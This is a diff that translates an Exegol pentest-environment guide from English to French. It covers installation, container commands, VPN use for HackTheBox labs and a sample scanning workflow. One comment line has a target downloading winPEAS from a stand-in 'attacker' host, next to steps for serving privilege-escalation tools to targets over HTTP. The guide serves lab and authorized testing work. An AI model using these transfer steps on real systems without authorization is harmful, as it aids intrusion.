@@ -1,125 +1,125 @@
-# Exegol: The Docker-Based Hacking Env
+# Exegol : Environnement de Hacking basé sur Docker
 
 `#pentest` `#docker` `#redteam` `#kali-killer`
 
-A modern, Docker-based alternative to Kali Linux for offensive security.
+Une alternative moderne basée sur Docker à Kali Linux pour la sécurité offensive.
 
 ---
 
-!!! question "Why Exegol?"
-    **The Kali Problem:**
+!!! question "Pourquoi Exegol ?"
+    **Le Problème Kali :**
 
-    - Monolithic VM that breaks on `apt upgrade`
-    - Dependency conflicts between tools
-    - Bloated with tools you never use
-    - Hard to version control your setup
+    - VM monolithique qui casse au moindre `apt upgrade`
+    - Conflits de dépendances entre les outils
+    - Alourdi par des outils que vous n'utilisez jamais
+    - Difficile de versionner votre configuration
 
-    **The Exegol Solution:**
+    **La Solution Exegol :**
 
-    - Disposable Docker containers
-    - Immutable, versioned tool images
-    - Persistent workspace for your data
-    - Clean host system, no pollution
+    - Conteneurs Docker jetables
+    - Images d'outils immuables et versionnées
+    - Workspace persistant pour vos données
+    - Système hôte propre, aucune pollution
 
-    **Key Benefit:** *Clean host, no dependency hell, fully versioned environments.*
+    **Avantage Clé :** *Hôte propre, pas d'enfer de dépendances, environnements entièrement versionnés.*
 
 ---
 
 ## Installation
 
-### Prerequisites
+### Prérequis
 
-- Docker (Desktop or Engine)
+- Docker (Desktop ou Engine)
 - Python 3.10+
 
-### Install Exegol Wrapper
+### Installer le Wrapper Exegol
 
 ```bash
-# Recommended: Install with pipx (isolated environment)
+# Recommandé : Installer avec pipx (environnement isolé)
 pipx install exegol
 
-# Alternative: pip
+# Alternative : pip
 pip install exegol --user
 
-# Verify installation
+# Vérifier l'installation
 exegol version
 ```
 
-### Pull Your First Image
+### Télécharger Votre Première Image
 
 ```bash
-# List available images
+# Lister les images disponibles
 exegol install
 
-# Install the full image (all tools)
+# Installer l'image complète (tous les outils)
 exegol install full
 
-# Or lighter alternatives
-exegol install light   # Common tools only
-exegol install ad      # Active Directory focused
-exegol install osint   # OSINT tools
-exegol install web     # Web pentest tools
+# Ou alternatives plus légères
+exegol install light   # Outils courants uniquement
+exegol install ad      # Focalisé Active Directory
+exegol install osint   # Outils OSINT
+exegol install web     # Outils pentest web
 ```
 
 ---
 
-## Core Commands Cheatsheet
+## Aide-Mémoire des Commandes Principales
 
-| Command | Description |
+| Commande | Description |
 |---------|-------------|
-| `exegol install` | List/install available images |
-| `exegol start <name> <image>` | Create and start a container |
-| `exegol stop <name>` | Stop a running container |
-| `exegol remove <name>` | Delete a container |
-| `exegol exec <name>` | Open new shell in running container |
-| `exegol info` | Show system info and containers |
-| `exegol update` | Update wrapper and images |
+| `exegol install` | Lister/installer les images disponibles |
+| `exegol start <name> <image>` | Créer et démarrer un conteneur |
+| `exegol stop <name>` | Arrêter un conteneur en cours |
+| `exegol remove <name>` | Supprimer un conteneur |
+| `exegol exec <name>` | Ouvrir un nouveau shell dans un conteneur en cours |
+| `exegol info` | Afficher les infos système et conteneurs |
+| `exegol update` | Mettre à jour le wrapper et les images |
 
-### Quick Start Example
+### Exemple de Démarrage Rapide
 
 ```bash
-# Create a container named "htb" using the "full" image
+# Créer un conteneur nommé "htb" utilisant l'image "full"
 exegol start htb full
 
-# You're now inside the container with all tools ready
-# When done:
+# Vous êtes maintenant dans le conteneur avec tous les outils prêts
+# Quand terminé :
 exit
 
-# Re-enter the same container later
+# Réentrer dans le même conteneur plus tard
 exegol start htb
 ```
 
 ---
 
-## Pro Features
+## Fonctionnalités Pro
 
-### The Workspace (`/workspace`)
+### Le Workspace (`/workspace`)
 
-!!! danger "Rule #1: Always Save Your Loot in /workspace"
-    `/workspace` inside the container maps to a folder on your **host machine**.
+!!! danger "Règle #1 : Toujours Sauvegarder Votre Butin dans /workspace"
+    `/workspace` dans le conteneur est mappé vers un dossier sur votre **machine hôte**.
 
-    Everything else in the container is **ephemeral**—if you delete the container, it's gone.
+    Tout le reste dans le conteneur est **éphémère**—si vous supprimez le conteneur, c'est perdu.
 
 ```bash
-# Inside container
+# Dans le conteneur
 cd /workspace
 
-# Your notes, exploits, screenshots go HERE
+# Vos notes, exploits, captures vont ICI
 mkdir notes scans exploits
 
-# This persists even if you destroy the container
+# Ceci persiste même si vous détruisez le conteneur
 ```
 
-**Default location on host:** `~/.exegol/workspaces/<container_name>/`
+**Emplacement par défaut sur l'hôte :** `~/.exegol/workspaces/<nom_conteneur>/`
 
 ### Resources (`/opt/resources`)
 
-Pre-downloaded offensive tools ready to upload to targets:
+Outils offensifs pré-téléchargés prêts à uploader vers les cibles :
 
 ```bash
 ls /opt/resources/
 
-# Contents include:
+# Contenu inclus :
 # ├── linux/
 # │   ├── linpeas.sh
 # │   ├── pspy64
@@ -133,120 +133,120 @@ ls /opt/resources/
 ```
 
 ```bash
-# Serve to target via HTTP
+# Servir vers la cible via HTTP
 cd /opt/resources/windows
 python -m http.server 80
 
-# On target:
+# Sur la cible :
 # wget http://attacker:80/winPEAS.exe
 ```
 
-### VPN Integration
+### Intégration VPN
 
-Connect your container to HackTheBox, TryHackMe, or client VPNs:
+Connecter votre conteneur à HackTheBox, TryHackMe, ou VPN clients :
 
 ```bash
-# Start container with VPN
+# Démarrer un conteneur avec VPN
 exegol start htb full --vpn /path/to/lab.ovpn
 
-# The container's network goes through the VPN
-# Your host network remains untouched
+# Le réseau du conteneur passe par le VPN
+# Le réseau de votre hôte reste intact
 ```
 
 ```bash
-# Multiple VPN profiles
+# Multiples profils VPN
 exegol start client1 full --vpn ~/vpn/client1.ovpn
 exegol start htb full --vpn ~/vpn/hackthebox.ovpn
 ```
 
-!!! tip "VPN per engagement"
-    Each container can have its own VPN connection. Perfect for separating client engagements.
+!!! tip "VPN par engagement"
+    Chaque conteneur peut avoir sa propre connexion VPN. Parfait pour séparer les engagements clients.
 
-### GUI Tools (X11)
+### Outils GUI (X11)
 
-Run graphical tools like Burp Suite, Firefox:
+Exécuter des outils graphiques comme Burp Suite, Firefox :
 
 ```bash
-# Linux (X11 forwarding automatic)
+# Linux (forwarding X11 automatique)
 exegol start audit full
 burpsuite &
 
-# macOS (requires XQuartz)
+# macOS (nécessite XQuartz)
 exegol start audit full --desktop
 ```
 
-### Custom Configuration
+### Configuration Personnalisée
 
 ```bash
-# Mount additional volumes
+# Monter des volumes supplémentaires
 exegol start audit full -v /path/to/scripts:/custom
 
-# Expose ports
+# Exposer des ports
 exegol start audit full -p 8080:8080
 
-# Privileged mode (for certain exploits)
+# Mode privilégié (pour certains exploits)
 exegol start audit full --privileged
 ```
 
 ---
 
-## Comparison: Kali VM vs Exegol
+## Comparaison : VM Kali vs Exegol
 
-| Aspect | Kali VM | Exegol |
+| Aspect | VM Kali | Exegol |
 |--------|---------|--------|
-| **Type** | Full Virtual Machine | Docker Container |
-| **Size** | 10-30 GB | 5-15 GB (image) |
-| **Boot time** | 30-60 seconds | 1-2 seconds |
-| **Tool updates** | `apt upgrade` (can break) | Pull new image (immutable) |
-| **State** | Stateful (changes persist) | Stateless system, stateful data |
-| **Host pollution** | Full OS in VM | None (isolated container) |
-| **Multi-environment** | Multiple VMs = heavy | Multiple containers = light |
-| **Versioning** | Manual snapshots | Docker tags (full:2024.01) |
-| **Rollback** | Restore snapshot | Use previous image tag |
-| **Resource usage** | High (RAM, CPU reserved) | Low (shared kernel) |
+| **Type** | Machine Virtuelle Complète | Conteneur Docker |
+| **Taille** | 10-30 GB | 5-15 GB (image) |
+| **Temps de boot** | 30-60 secondes | 1-2 secondes |
+| **Mise à jour outils** | `apt upgrade` (peut casser) | Pull nouvelle image (immuable) |
+| **État** | Stateful (les changements persistent) | Système stateless, données stateful |
+| **Pollution hôte** | OS complet dans VM | Aucune (conteneur isolé) |
+| **Multi-environnement** | Multiples VMs = lourd | Multiples conteneurs = léger |
+| **Versioning** | Snapshots manuels | Tags Docker (full:2024.01) |
+| **Rollback** | Restaurer snapshot | Utiliser tag d'image précédent |
+| **Utilisation ressources** | Élevée (RAM, CPU réservés) | Faible (kernel partagé) |
 
 ---
 
-## Workflow Example: HTB Machine
+## Exemple de Workflow : Machine HTB
 
 ```bash
-# 1. Start fresh container for the box
+# 1. Démarrer un conteneur frais pour la box
 exegol start htb-devvortex full --vpn ~/htb/lab.ovpn
 
-# 2. Inside container - create workspace structure
+# 2. Dans le conteneur - créer la structure du workspace
 cd /workspace
 mkdir -p devvortex/{nmap,web,privesc}
 
-# 3. Run your scans (tools pre-installed)
+# 3. Lancer vos scans (outils pré-installés)
 nmap -sCV -oA devvortex/nmap/initial 10.10.11.xxx
 feroxbuster -u http://devvortex.htb -o devvortex/web/ferox.txt
 
-# 4. All output saved to /workspace (persists on host)
+# 4. Toute la sortie sauvegardée dans /workspace (persiste sur l'hôte)
 
-# 5. When done, container can be removed
+# 5. Quand terminé, le conteneur peut être supprimé
 exit
 exegol remove htb-devvortex
-# Workspace data still exists at ~/.exegol/workspaces/htb-devvortex/
+# Les données du workspace existent toujours dans ~/.exegol/workspaces/htb-devvortex/
 ```
 
 ---
 
-## Useful Aliases
+## Alias Utiles
 
-Add to your `~/.bashrc` or `~/.zshrc`:
+Ajouter à votre `~/.bashrc` ou `~/.zshrc` :
 
 ```bash
-# Quick start for common scenarios
+# Démarrage rapide pour scénarios courants
 alias htb='exegol start htb full --vpn ~/vpn/htb.ovpn'
 alias thm='exegol start thm full --vpn ~/vpn/thm.ovpn'
 alias audit='exegol start audit full'
 
-# Quick shell into running container
+# Shell rapide dans un conteneur en cours
 alias exs='exegol start'
 alias exe='exegol exec'
 ```
 
-!!! info "Official Resources"
-    - GitHub: [ThePorgs/Exegol](https://github.com/ThePorgs/Exegol)
-    - Docs: [exegol.readthedocs.io](https://exegol.readthedocs.io)
-    - Discord: Active community for support
+!!! info "Ressources Officielles"
+    - GitHub : [ThePorgs/Exegol](https://github.com/ThePorgs/Exegol)
+    - Docs : [exegol.readthedocs.io](https://exegol.readthedocs.io)
+    - Discord : Communauté active pour le support
